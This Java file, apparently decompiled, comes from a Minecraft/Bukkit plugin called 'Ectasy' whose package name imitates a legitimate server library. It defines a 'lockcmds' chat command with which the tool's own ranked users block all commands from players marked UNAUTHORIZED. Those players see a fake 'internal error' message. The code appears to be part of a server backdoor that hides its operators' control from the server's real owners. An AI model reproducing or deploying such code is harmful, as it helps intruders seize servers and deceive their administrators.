package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

@CommandInfo(
   name = "lockcmds",
   description = "Make non-logged user unable to execute commands.",
   blatant = true,
   rank = Rank.FREE
)
public class LockCmdCommand extends AbstractCommand implements Listener {
   public boolean locked = false;

   @EventHandler
   public void onCommand(PlayerCommandPreprocessEvent var1) {
      User var2 = Ectasy.users.get(var1.getPlayer().getName());
      if (var2.rank == Rank.UNAUTHORIZED) {
         if (this.locked) {
            var1.setCancelled(true);
            var1.getPlayer().sendMessage("§cAn internal error has occured while attempting to execute this command.");
         }
      }
   }

   public LockCmdCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      this.locked = !this.locked;
      ChatUtil.sendChat(var1.getPlayer(), "The commands are now " + (this.locked ? "&clocked" : "&aunlocked"));
   }
}
